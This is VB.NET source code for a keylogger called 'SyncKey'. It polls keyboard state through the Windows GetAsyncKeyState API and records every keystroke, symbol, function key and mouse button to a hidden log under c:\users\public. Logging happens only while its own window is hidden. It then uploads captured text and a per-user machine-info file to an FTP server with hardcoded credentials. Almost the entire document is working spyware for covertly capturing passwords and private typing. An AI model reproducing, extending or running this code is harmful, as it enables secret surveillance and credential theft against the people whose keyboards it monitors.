Imports System.Net.Mail
Imports System.Net
Imports Limilabs.FTP.Client
Imports System.Text

Module Module1

    ' Variaveis SyncKeyboard Detector teclas
    Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Long) As Integer
    Public Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
    Public Const sk As Integer = 16
    Public result As Integer
    Public rs As Integer
    Public letter As String

    ' Variaveis Settings
    Public name As String = "SyncKey"
    Public version As String = "2.1.0"
    Public dateupdate As String = "09.04.2013"

    'Variaveis Server FTP
    Public ftp_user As String = "alex"
    Public ftp_password As String = "admin123"
    Public ftp_server As String = "localhost"
    Public ftp_folder As String = System.Environment.UserName + "_" + dayString + "_" + timeString
    Public ftp_log As String = "/" + ftp_folder + "/log.txt"

    ' Variaveis Local Folder
    Public folder As String = "c:\users\public\" + System.Environment.UserName + "_" + dayString + "_" + timeString
    Public log As String = folder + "\log.txt"

    ' X - TESTE
    ' Variaveis sobre Data e Hora
    ' Update sempre (so esta a dar a hora que cria as variaveis)
    Public dateNow As Date = Now.Date
    Public dayString As String = dateNow.ToString("MMM_d_yyyy")
    ' PM ou AM, para depois nao criar pastas iguais
    Public timeString As String = Format(Now, "hh_mm_ss")

    ' X - DO: Documentar
    ' Metodo para detectar teclas
    ' - 1. 
    Public Sub SyncKeyboard()

        Dim i As Integer
        letter = Nothing

        For i = 2 To 90
            result = 0
            result = GetAsyncKeyState(i)
            If result = -32767 Then
                letter = Chr(i)
                ' TESTE
                ' MsgBox("Letter: " & letter & " / i: " & i, MsgBoxStyle.Information, "ID")
                Exit For
            End If
        Next i

        rs = GetAsyncKeyState(188)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(Module1.log, IIf(rs < 0, ";", ","), True)
        End If

        rs = GetAsyncKeyState(189)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(Module1.log, IIf(rs < 0, "_", "-"), True)
        End If

        rs = GetAsyncKeyState(190)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(Module1.log, IIf(rs < 0, ":", "."), True)
        End If

        rs = GetAsyncKeyState(191)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(Module1.log, IIf(rs < 0, "^", "~"), True)
        End If

        rs = GetAsyncKeyState(192)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(Module1.log, IIf(rs < 0, "Ç", "ç"), True)
        End If

        rs = GetAsyncKeyState(186)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(Module1.log, IIf(rs < 0, "`", "´"), True)
        End If

        rs = GetAsyncKeyState(187)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(Module1.log, IIf(rs < 0, "*", "+"), True)
        End If

        rs = GetAsyncKeyState(219)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(Module1.log, IIf(rs < 0, "?", "'"), True)
        End If

        rs = GetAsyncKeyState(221)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(Module1.log, IIf(rs < 0, "»", "«"), True)
        End If

        rs = GetAsyncKeyState(226)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(Module1.log, IIf(rs < 0, ">", "<"), True)
        End If

        rs = GetAsyncKeyState(220)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(Module1.log, IIf(rs < 0, "|", "\"), True)
        End If

        rs = GetAsyncKeyState(222)
        If rs = -32767 Then
            rs = GetKeyState(sk)
            My.Computer.FileSystem.WriteAllText(Module1.log, IIf(rs < 0, "ª", "º"), True)
        End If

        rs = GetAsyncKeyState(109)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "-", True)
        End If

        rs = GetAsyncKeyState(91)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(WINDOWS)", True)
        End If

        rs = GetAsyncKeyState(173)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(MUTE)", True)
        End If

        rs = GetAsyncKeyState(112)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(F1)", True)
        End If

        rs = GetAsyncKeyState(178)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(MUSIC STOP)", True)
        End If

        rs = GetAsyncKeyState(177)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(MUSIC BACKWARD)", True)
        End If

        rs = GetAsyncKeyState(176)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(MUSIC FORWARD)", True)
        End If

        rs = GetAsyncKeyState(179)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(MUSIC PLAY)", True)
        End If

        rs = GetAsyncKeyState(174)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(SOUND REDUCE)", True)
        End If

        rs = GetAsyncKeyState(175)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(SOUND INCREASE)", True)
        End If

        rs = GetAsyncKeyState(182)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(MY COMPUTER)", True)
        End If

        rs = GetAsyncKeyState(183)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(CALCULATOR)", True)
        End If

        rs = GetAsyncKeyState(181)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(WINDOWS MEDIA PLAYER)", True)
        End If

        rs = GetAsyncKeyState(170)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(SEARCH)", True)
        End If

        rs = GetAsyncKeyState(180)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(MAIL)", True)
        End If

        rs = GetAsyncKeyState(172)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(WEB HOME)", True)
        End If

        rs = GetAsyncKeyState(168)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(WEB REFRESH)", True)
        End If

        rs = GetAsyncKeyState(169)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(WEB ABORT)", True)
        End If

        rs = GetAsyncKeyState(167)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(WEB FORWARD)", True)
        End If

        rs = GetAsyncKeyState(166)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(WEB BACKWARD)", True)
        End If

        rs = GetAsyncKeyState(113)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(F2)", True)
        End If

        rs = GetAsyncKeyState(114)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(F3)", True)
        End If

        rs = GetAsyncKeyState(115)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(F4)", True)
        End If

        rs = GetAsyncKeyState(116)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(F5)", True)
        End If

        rs = GetAsyncKeyState(117)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(F6)", True)
        End If

        rs = GetAsyncKeyState(118)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(F7)", True)
        End If

        rs = GetAsyncKeyState(119)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(F8)", True)
        End If

        rs = GetAsyncKeyState(120)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(F9)", True)
        End If

        rs = GetAsyncKeyState(121)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(F10)", True)
        End If

        rs = GetAsyncKeyState(122)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(F11)", True)
        End If

        rs = GetAsyncKeyState(123)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(F12)", True)
        End If

        rs = GetAsyncKeyState(106)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "*", True)
        End If

        rs = GetAsyncKeyState(111)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "/", True)
        End If

        rs = GetAsyncKeyState(110)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, ".", True)
        End If

        rs = GetAsyncKeyState(107)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "+", True)
        End If

        rs = GetAsyncKeyState(144)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(NUM LOCK)", True)
        End If

        rs = GetAsyncKeyState(96)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "0", True)
        End If

        rs = GetAsyncKeyState(97)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "1", True)
        End If

        rs = GetAsyncKeyState(98)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "2", True)
        End If

        rs = GetAsyncKeyState(99)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "3", True)
        End If

        rs = GetAsyncKeyState(100)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "4", True)
        End If

        rs = GetAsyncKeyState(101)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "5", True)
        End If

        rs = GetAsyncKeyState(102)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "6", True)
        End If

        rs = GetAsyncKeyState(103)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "7", True)
        End If

        rs = GetAsyncKeyState(104)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "8", True)
        End If

        rs = GetAsyncKeyState(105)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "9", True)
        End If

        rs = GetAsyncKeyState(145)
        If rs = -32767 Then
            My.Computer.FileSystem.WriteAllText(Module1.log, "(SCROLL LOCK)", True)
        End If

        If frmMain.Visible = True Then
        Else
            If letter <> Nothing Then

                If My.Computer.Keyboard.AltKeyDown And letter = "2" Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "@", True)
                ElseIf My.Computer.Keyboard.AltKeyDown And letter = "3" Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "£", True)
                ElseIf My.Computer.Keyboard.AltKeyDown And letter = "4" Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "§", True)
                ElseIf My.Computer.Keyboard.AltKeyDown And letter = "5" Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "€", True)
                ElseIf My.Computer.Keyboard.AltKeyDown And letter = "7" Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "{", True)
                ElseIf My.Computer.Keyboard.AltKeyDown And letter = "8" Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "[", True)
                ElseIf My.Computer.Keyboard.AltKeyDown And letter = "9" Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "]", True)
                ElseIf My.Computer.Keyboard.AltKeyDown And letter = "0" Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "}", True)
                ElseIf My.Computer.Keyboard.ShiftKeyDown And letter = "1" Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "!", True)
                ElseIf My.Computer.Keyboard.ShiftKeyDown And letter = "2" Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, """", True)
                ElseIf My.Computer.Keyboard.ShiftKeyDown And letter = "3" Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "#", True)
                ElseIf My.Computer.Keyboard.ShiftKeyDown And letter = "4" Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "$", True)
                ElseIf My.Computer.Keyboard.ShiftKeyDown And letter = "5" Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "%", True)
                ElseIf My.Computer.Keyboard.ShiftKeyDown And letter = "6" Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "&", True)
                ElseIf My.Computer.Keyboard.ShiftKeyDown And letter = "7" Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "/", True)
                ElseIf My.Computer.Keyboard.ShiftKeyDown And letter = "8" Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(", True)
                ElseIf My.Computer.Keyboard.ShiftKeyDown And letter = "9" Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, ")", True)
                ElseIf My.Computer.Keyboard.ShiftKeyDown And letter = "0" Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "=", True)
                ElseIf i = 16 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(SHIFT)", True)
                ElseIf i = 17 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(CTRL)", True)
                ElseIf i = 2 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(RIGHT MOUSE)", True)
                ElseIf i = 8 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(BACKSPACE)", True)
                ElseIf i = 9 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(TAB)", True)
                ElseIf i = 4 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(MIDDLE MOUSE)", True)
                ElseIf i = 5 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(MOUSE 4)", True)
                ElseIf i = 6 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(MOUSE 5)", True)
                ElseIf i = 44 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(PRINTSCREEN)", True)
                ElseIf i = 33 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(PAGEUP)", True)
                ElseIf i = 34 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(PAGEDOWN)", True)
                ElseIf i = 35 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(END)", True)
                ElseIf i = 45 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(INSERT)", True)
                ElseIf i = 36 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(HOME)", True)
                ElseIf i = 46 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(DELETE)", True)
                ElseIf i = 20 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(CAPSLOCK)", True)
                ElseIf i = 46 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(DELETE)", True)
                ElseIf i = 18 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(ALT)", True)
                ElseIf i = 19 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(PAUSE)", True)
                ElseIf i = 27 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(ESC)", True)
                ElseIf i = 37 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(LEFT)", True)
                ElseIf i = 39 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(RIGHT)", True)
                ElseIf i = 38 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(UP)", True)
                ElseIf i = 40 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(DOWN)", True)
                ElseIf i = 12 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(PAGE BREAK)", True)
                ElseIf i = 13 Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, "(ENTER)" & vbNewLine, True)
                ElseIf My.Computer.Keyboard.ShiftKeyDown OrElse My.Computer.Keyboard.CapsLock Then
                    My.Computer.FileSystem.WriteAllText(Module1.log, letter, True)
                Else
                    My.Computer.FileSystem.WriteAllText(Module1.log, letter.ToLower, True)
                End If
            End If
        End If
    End Sub

    ' Metodo "SyncServer": fazer sincronizacao ficheiro com servidor
    ' @params message (String): Message to upload
    ' - 1. Create FTP Cliand and Connect to FTP Server
    ' - 2. Check/Create FTP Folder
    ' - 3. Find Local Log and upload it
    ' - 4. Close FTP Client
    Public Sub SyncServer(message As String)
        ' - 1. Create FTP Cliand and Connect to FTP Server
        Dim client As New Ftp() ' new client FTP
        client.Connect(ftp_server) ' connect server
        client.Login(ftp_user, ftp_password) ' login client to server
        ' - 2. Check/Create FTP Folder
        client.ChangeFolder("logs") ' change folder
        Try ' check if "ftp_folder" exists, if not create one
            client.ChangeFolder(ftp_folder)
            MsgBox("ftp_folder exists!" & vbNewLine & "- ftp_folder: " & ftp_folder)
        Catch ex As Exception
            client.CreateFolder(ftp_folder)
            client.ChangeFolder(ftp_folder)
            MsgBox("ftp_folder doesn't exist!""- ftp_folder: " & ftp_folder)
        End Try
        ' - 3. Find Local Log and upload it
        MsgBox("Local Log: " & log & vbNewLine & "FTP Log: " & ftp_log)
        Dim data As Byte() = Encoding.[Default].GetBytes(message)
        client.Upload("message.txt", data)
        ' - 4. Close FTP Client
        client.Close()

    End Sub

    ' X - TESTE
    ' Metodo "SyncInfo": fazer sincronizacao Info servidor
    ' - 1. Create FTP Cliand and Connect to FTP Server
    ' - 2. Check/Create FTP Folder
    ' - 3. Find Local Log and upload it
    ' - 4. Close FTP Client
    Public Sub SyncInfo()
        ' - 1. Create FTP Cliand and Connect to FTP Server
        Dim client As New Ftp()
        client.Connect(ftp_server)       ' or ConnectSSL for SSL
        client.Login(ftp_user, ftp_password)
        ' - 2. Check/Create FTP Folder
        client.ChangeFolder("info")
        ' - 3. Find Local Log and upload it
        Dim info As String = System.IO.File.ReadAllText("c:\users\public\info.txt")
        Dim data As Byte() = Encoding.[Default].GetBytes(info)
        client.Upload(System.Environment.UserName + "_" + My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BaseBoardProduct", Nothing) + ".txt", data)
        ' - 4. Close FTP Client
        client.Close()
    End Sub

End Module
